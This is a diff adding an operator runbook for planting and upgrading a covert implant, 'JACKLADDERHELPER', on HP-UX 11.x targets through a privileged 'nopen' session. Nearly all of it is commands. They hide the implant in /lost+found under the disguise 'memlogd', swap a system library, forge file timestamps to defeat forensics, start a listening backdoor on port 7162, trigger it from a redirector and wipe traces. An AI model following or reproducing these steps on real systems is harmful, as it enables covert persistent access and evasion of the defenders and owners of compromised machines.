@@ -1,0 +1,129 @@
+###################################################################################
+###  HP-UX B.11.00 and 11.11 JACKLADDERHELPER installation (HPPA-2.0w-HP-HPUX11.xx)
+###################################################################################
+
+### This assumes that INCISION is installed on the target and you are running
+### in a privileged nopen window
+
+### make sure OS is HP-UX B.11.00
+uname -a
+
+### get system configuration value for CPU_VERSION; should return 532
+/usr/bin/getconf SC_CPU_VERSION
+
+### get system configuration value for KERNEL_BITS; should return 64
+/usr/bin/getconf SC_KERNEL_BITS
+
+### get the status of any kernel modules that are currently loaded
+kmadmin -s
+
+### Create a working dir
+mkdir /tmp/.scsi
+-cd /tmp/.scsi
+
+
+###################################################################################
+####################  Upgrade JACKLADDER
+###################################################################################
+
+### If JL  and JACKHELPER have been installed but need to be upgraded, 
+### do this section:
+
+### save times of hidden directory:
+./it /lost+found
+./it /lost+found/3d9892354a360245add0f483f269f384
+
+-put /current/up/<NEWJL> <NEWJL>
+-lt /usr/lib/lib[Yy].1
+./it /usr/lib/libY.1
+
+mv /usr/lib/libY.1 /lost+found/3d9892354a360245add0f483f269f384
+cp <NEWJL> /usr/lib/libY.1
+# touch -r /lost+found/3d9892354a360245add0f483f269f384/libY.1 /usr/lib/libY.1
+./it -f <ITIMES> /usr/lib/libY.1
+
+### to restart "JACKLADDERHELPER":
+ps -ef |grep memlogd
+kill -9 <PID>
+
+### skip to next section to restart JACKLADDERHELPER
+
+### to remove JL from inetd:
+# dep inetd libY.1 libc.2
+
+###################################################################################
+####################  Install JACKLADDERHELPER 
+###################################################################################
+
+### Decide which port to use to trigger JACKLADDERHELPER:
+
+netstat -an |grep LIST
+
+netstat -an |grep 7162
+
+### Verify you get a reset (or actively refused) when scanning from the redirector:
+
+# from unix:
+-scan 7162 TARGET_IP
+
+# from windows:
+banner -ip TARGET_IP -port 7162
+
+### Upload JL as memlogd in the hidden dir:
+### Be sure your nopen is blessed by INCISION
+
+./it /lost+found
+./it /lost+found/3d9892354a360245add0f483f269f384
+
+
+### Check if the target has a legitimate memlogd running:
+
+ps -ef |grep memlogd
+
+-put /current/up/jackladderhelper /lost+found/3d9892354a360245add0f483f269f384/memlogd
+-lt  /lost+found/3d9892354a360245add0f483f269f384
+
+### Fix itimes:
+./it -f SAVED_TIME /lost+found/3d9892354a360245add0f483f269f384/memlogd
+./it -f SAVED_TIME /lost+found/3d9892354a360245add0f483f269f384
+./it -f SAVED_TIME /lost+found
+
+-lt -R /lost+found
+
+
+### Start it from within /tmp so that cup won't kill it when it wipes .scsi
+### This one tests that the path is correct:
+-getenv
+cd /tmp; PATH=/lost+found/3d9892354a360245add0f483f269f384:/bin:/usr/bin:/sbin:/usr/sbin export PATH; which memlogd
+
+### This one starts it listening:
+cd /tmp; PATH=/lost+found/3d9892354a360245add0f483f269f384:/bin:/usr/bin:/sbin:/usr/sbin export PATH; echo 7162 | memlogd
+
+netstat -an |grep 7162
+
+ps -ef |grep memlogd
+
+### Test JACKLADDERHELPER from redirector:
+### special source ports: 3, 51, 8213, 12634, 16798, 23247
+
+-jackpop TARGET_IP 7162 REDIRECTOR_IP SPECIAL_SOURCE_PORT_FROM_ABOVE
+
+3
+0
+Y
+date 2>&0 1>&0
+DONE
+
+### rescan to make sure JACKLADDERHELPER port still listening:
+
+-scan 7162 TARGET_IP
+
+
+### clean up:
+-lt
+-rm <STUFF>
+-cd /tmp
+-rm .scsi
+
+
+
